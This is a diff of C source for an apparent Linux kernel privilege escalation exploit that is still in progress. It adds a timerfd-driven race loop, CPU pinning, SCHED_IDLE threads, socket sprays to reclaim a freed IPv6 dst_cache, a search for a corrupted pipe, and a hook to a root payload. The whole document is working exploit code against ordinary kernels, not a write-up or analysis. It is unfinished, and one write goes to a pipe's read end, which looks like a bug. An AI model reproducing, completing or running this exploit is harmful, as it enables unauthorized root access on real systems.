@@ -1,3 +1,4 @@
+// #include <bits/time.h>
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -10,8 +11,10 @@
 #include <errno.h>
 #include <pthread.h>
 #include <fcntl.h>
+#include <stdatomic.h>
 #include <sched.h>
 #include <string.h>
+#include <sys/timerfd.h>
 #include <assert.h>
 #include <sys/uio.h>
 #include <sys/ioctl.h>
@@ -19,6 +22,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <netinet/udp.h>
+#include <sys/syscall.h>
 #include <arpa/inet.h>
 #include <root_payload.h>
 
@@ -59,7 +63,12 @@ typedef size_t usize;
     __res;                              \
 })
 
-int pin_to_cpu(int cpu) {
+void panic(const char *msg) {
+    puts(msg);
+    exit(1);
+}
+
+int pin_thread_to_cpu(pid_t pid, int cpu) {
     int rc;
     int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
     cpu_set_t *cpu_setp = CPU_ALLOC(num_cpus);
@@ -73,7 +82,7 @@ int pin_to_cpu(int cpu) {
         }
     }
 
-    rc = sched_setaffinity(0, size, cpu_setp);
+    rc = sched_setaffinity(pid, size, cpu_setp);
     // if (rc) {
     //     printf("cpu %d failed to be pinned (num cpus = %d)\n", cpu, num_cpus);
     //     perror("sched_setaffinity");
@@ -82,10 +91,33 @@ int pin_to_cpu(int cpu) {
     return rc;
 }
 
-void panic(const char *msg) {
-    puts(msg);
-    exit(1);
+int pin_to_cpu(int cpu) {
+    return pin_thread_to_cpu(0, cpu);
 }
+
+void make_thread_idle() {
+    struct sched_param param;
+
+    memset(&param, 0, sizeof(param));
+    SYSCHK(sched_setscheduler(0, SCHED_IDLE, &param));
+}
+
+u64 now_ns() {
+    struct timespec ts;
+
+    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &ts));
+
+    return (u64)ts.tv_sec * 1000000000ull + (u64)ts.tv_nsec;
+}
+
+static struct timespec ns_to_timespec(u64 ns) {
+    struct timespec ts;
+
+    ts.tv_sec = (time_t)(ns / 1000000000ull);
+    ts.tv_nsec = (long)(ns % 1000000000ull);
+    return ts;
+}
+
 
 typedef struct {
     int read_fd;
@@ -102,6 +134,11 @@ Pipe open_pipe() {
     return pipe;
 }
 
+void pipe_close(Pipe *pipe) {
+    SYSCHK(close(pipe->read_fd));
+    SYSCHK(close(pipe->write_fd));
+}
+
 void pipe_set_buf_size(Pipe *pipe, usize size) {
     CHECK(fcntl(pipe->write_fd, F_SETPIPE_SZ, size), size);
 }
@@ -109,7 +146,7 @@ void pipe_set_buf_size(Pipe *pipe, usize size) {
 void pipe_prefault(Pipe *pipe) {
     u8 buf = 0;
     SYSCHK(write(pipe->write_fd, &buf, sizeof(buf)));
-    CHECK(read(pipe->write_fd, &buf, sizeof(buf)), sizeof(buf));
+    CHECK(read(pipe->read_fd, &buf, sizeof(buf)), sizeof(buf));
 }
 
 #define NUM_SPRAY 0x400
@@ -232,47 +269,172 @@ void close_fds(int *fd_array, usize len) {
     }
 }
 
-void *trigger_vuln_dst_cache_free(void *arg) {
-    int write_fd = (int) (usize) arg;
-    pin_to_cpu(1);
+/////////////////////////////
+//// Trigger Logic       ////
+/////////////////////////////
 
-    return NULL;
-}
-
-void *preempt_free_thread(void *arg) {
-    int read_fd = (int) (usize) arg;
-    pin_to_cpu(1);
-
-    // TODO: set priority
-    u8 buf = 0;
-
-    SYSCHK(read(read_fd, &buf, sizeof(buf)));
-
-    // spin indefinately (nut ub apparently if constant expression)
-    // cannot sleep I think, then other thread may wake up
-    for (;;) {}
-
-    return NULL;
-}
-
-void trigger_vuln(int socket_fd) {
-    pthread_t trigger_thread = { 0 };
-    pthread_t block_thread = { 0 };
-
-    int preempt_pipes[2] = { 0 };
-    SYSCHK(pipe(preempt_pipes));
-
-    SYSCHK(pthread_create(&block_thread, NULL, preempt_free_thread, (void *) (usize) preempt_pipes[0]));
-    // wait for thread to read from pipe
-    sleep(1);
-}
 
 #define NUM_PAGE_PIPES 0x600
 #define NUM_VULN_PIPES 0x20
 #define NUM_PRE_SOCKETS 1024
 #define NUM_POST_SOCKETS 1024
 
-void exploit() {
+typedef struct {
+    atomic_int ready_counter;
+    // atomic_int timer_wakeup;
+    int timer_fd;
+    atomic_int vuln_socket;
+    int pre_sockets[NUM_PRE_SOCKETS];
+    int post_sockets[NUM_POST_SOCKETS];
+    atomic_int trigger_thread;
+    Pipe sync_pipe_to_trigger;
+    u64 timer_offset;
+} TriggerCtx;
+
+void *run_cpu1_block_thread(void *arg) {
+    pin_to_cpu(1);
+
+    TriggerCtx *ctx = (TriggerCtx *) arg;
+    atomic_fetch_add(&ctx->ready_counter, 1);
+
+    // busy loop forever
+    for (;;) {}
+}
+
+void *run_trigger_thread(void *arg) {
+    TriggerCtx *ctx = (TriggerCtx *) arg;
+    atomic_store(&ctx->trigger_thread, syscall(SYS_gettid));
+
+    pin_to_cpu(0);
+    make_thread_idle();
+
+    // retry race in loop
+    for (;;) {
+        // wait with pipe, needed also because timer could fire in weird spots
+        // where ready counter is still 2
+        u8 buf = 0;
+        SYSCHK(read(ctx->sync_pipe_to_trigger.read_fd, &buf, sizeof(buf)));
+
+        // wait for other threads to be ready
+        while (atomic_load(&ctx->ready_counter) < 2) {}
+
+        // ensure we are on cpu 0 (should already be done)
+        pin_to_cpu(0);
+
+        // wait a bit more just in case
+        // for (usize i = 0; i < 1024 * 1024; i++) {}
+
+        // read socket fd before setting timer, if timer expires before setsockopt main thread might change socket
+        int socket_fd = atomic_load(&ctx->vuln_socket);
+
+        // arm timer
+        struct itimerspec spec = { 0 };
+        spec.it_value = ns_to_timespec(now_ns() + ctx->timer_offset);
+        SYSCHK(timerfd_settime(ctx->timer_fd, TFD_TIMER_ABSTIME, &spec, NULL));
+
+        int one = 1;
+        // don't check result, socket might be closed
+        setsockopt(socket_fd, SOL_IPV6, SO_CNX_ADVICE, &one, sizeof(one));
+    }
+}
+
+void try_run_main_exploit(TriggerCtx *ctx);
+
+void trigger_vuln_loop() {
+    pthread_t cpu1_block_thread = { 0 };
+    pthread_t trigger_thread = { 0 };
+
+    TriggerCtx ctx = {
+        .ready_counter = 0,
+        .timer_fd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC)),
+        .vuln_socket = 0,
+        .pre_sockets = { 0 },
+        .post_sockets = { 0 },
+        .trigger_thread = 0,
+        .sync_pipe_to_trigger = open_pipe(),
+        .timer_offset = 240000,
+    };
+
+    // this thread will spin on cpu1 forever
+    SYSCHK(pthread_create(&cpu1_block_thread, NULL, run_cpu1_block_thread, (void *) &ctx));
+
+    // create the trigger thread
+    SYSCHK(pthread_create(&trigger_thread, NULL, run_trigger_thread, (void *) &ctx));
+
+    // wait for trigger thread tid to become available
+    while (atomic_load(&ctx.trigger_thread) == 0) {}
+    pid_t trigger_pid = atomic_load(&ctx.trigger_thread);
+
+    usize iteration_count = 0;
+    usize too_long_count = 0;
+
+    // spray sockets for setup
+    open_many_sockets(ctx.pre_sockets, NUM_PRE_SOCKETS);
+    ctx.vuln_socket = open_connected_ipv6_udp_socket();
+    open_many_sockets(ctx.post_sockets, NUM_POST_SOCKETS);
+
+    for (;;) {
+        // adjust timerfd timing based on previous runs
+        if (iteration_count == 5) {
+            if (too_long_count == 5) {
+                ctx.timer_offset -= 2000;
+                LOG("Decrease time window to: %ll", ctx.timer_offset);
+            } else if (too_long_count == 0) {
+                // being too short is much more expensive
+                ctx.timer_offset += 20000;
+                LOG("Increase time window to: %ll", ctx.timer_offset);
+            }
+            // if there was a mix of too long and too short, we will eventually hit the race probably
+
+            iteration_count = 0;
+            too_long_count = 0;
+        }
+
+        // let trigger know it can continue another iteration
+        u8 buf = 0;
+        SYSCHK(write(ctx.sync_pipe_to_trigger.read_fd, &buf, sizeof(buf)));
+
+        // sets up trigger thread to run and trigger exploit
+        pin_thread_to_cpu(trigger_pid, 0);
+
+        // trigger actual exploit (will context switch to trigger thread)
+        atomic_fetch_add(&ctx.ready_counter, 1);
+        u64 result = 0;
+        SYSCHK(read(ctx.timer_fd, &result, sizeof(result)));
+        atomic_fetch_sub(&ctx.ready_counter, 1); // no longer ready
+
+        // move trigger thread to cpu, so we can sleep and such and not worry about blocking
+        pin_thread_to_cpu(trigger_pid, 1);
+
+        iteration_count += 1;
+
+        int mtu = 0;
+        socklen_t mtu_len = sizeof(mtu);
+        if (getsockopt(ctx.vuln_socket, SOL_IPV6, IPV6_MTU, &mtu, &mtu_len) == -1) {
+            // race failed: too long
+            too_long_count += 1;
+
+            // reset just the vuln socket, sprayed sockets don't need to be reset
+            SYSCHK(close(ctx.vuln_socket));
+            ctx.vuln_socket = open_connected_ipv6_udp_socket();
+
+            continue;
+        }
+
+        // try exploit: race may or may not have succeeded
+        // doesn't seem like a cheap way to see if race suceeded other then doing the exploit
+        // there may be an option which requires a remote server
+        try_run_main_exploit(&ctx);
+
+        // if we returned, setup sockets for retry
+        open_many_sockets(ctx.pre_sockets, NUM_PRE_SOCKETS);
+        ctx.vuln_socket = open_connected_ipv6_udp_socket();
+        open_many_sockets(ctx.post_sockets, NUM_POST_SOCKETS);
+    }
+}
+
+// returns on failure, should be retried
+void try_run_main_exploit(TriggerCtx *ctx) {
     Pipe page_pipes[NUM_PAGE_PIPES] = { 0 };
     Pipe vuln_pipes[NUM_VULN_PIPES] = { 0 };
 
@@ -296,22 +458,9 @@ void exploit() {
         write(vuln_pipes[i].write_fd, &buf, sizeof(buf));
     }
 
-    // first spray any sockets, to fill rt6_info kmalloc cache
-    // TODO: tune these values for cross cache attack
-    int sockets_pre_spray[NUM_PRE_SOCKETS] = { 0 };
-    int sockets_post_spray[NUM_POST_SOCKETS] = { 0 };
-
-    open_many_sockets(sockets_pre_spray, NUM_PRE_SOCKETS);
-    int vuln_fd = open_connected_ipv6_udp_socket();
-    open_many_sockets(sockets_post_spray, NUM_POST_SOCKETS);
-
-    // TODO: trigger_vuln is not correct rn
-    // assume it results in this sockets dst_cache being freed, still having a valid pointer, but socket lock is held
-    trigger_vuln(vuln_fd);
-
     // close many sockets, hopefully buddy allocator reclaims backing page
-    close_fds(sockets_pre_spray, NUM_PRE_SOCKETS);
-    close_fds(sockets_post_spray, NUM_POST_SOCKETS);
+    close_fds(ctx->pre_sockets, NUM_PRE_SOCKETS);
+    close_fds(ctx->post_sockets, NUM_POST_SOCKETS);
 
     // TODO: setup payload we want to spray
     // after spray, dst_cache hopefully reclaimed
@@ -319,7 +468,7 @@ void exploit() {
 
     // now write/send should trigger 'invalid' dst_cache route to be released
     u8 buf = 0;
-    SYSCHK(write(vuln_fd, &buf, sizeof(buf)));
+    SYSCHK(write(ctx->vuln_socket, &buf, sizeof(buf)));
 
     // change vuln pipe buffer to put them in kmalloc-256
     // will hopefully cause pipe to fill freed slot in sprayed object
@@ -350,12 +499,33 @@ void exploit() {
     }
 
     if (bad_index == -1) {
+        // will retry exit after failure
         LOG("FAIL: could not corrupt pipe");
-        getchar();
+
+        // close all resources used in exploit
+        for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
+            pipe_close(&page_pipes[i]);
+        }
+
+        for (usize i = 0; i < NUM_VULN_PIPES; i++) {
+            pipe_close(&vuln_pipes[i]);
+        }
+
+        SYSCHK(close(ctx->vuln_socket));
+
         return;
     }
 
+    // at this point, exploit has succeeded
     Pipe exp_pipe = vuln_pipes[bad_index];
+
+    LOG("found corrupted pipe FIONREAD");
+
+    // root_payload();
+
+    while (1) {
+        sleep(1000);
+    }
 }
 
 int main() {
@@ -363,11 +533,7 @@ int main() {
 
     pin_to_cpu(0);
 
-    exploit();
+    trigger_vuln_loop();
 
-    root_payload();
-
-    while (1) {
-        sleep(1000);
-    }
+    return 0;
 }
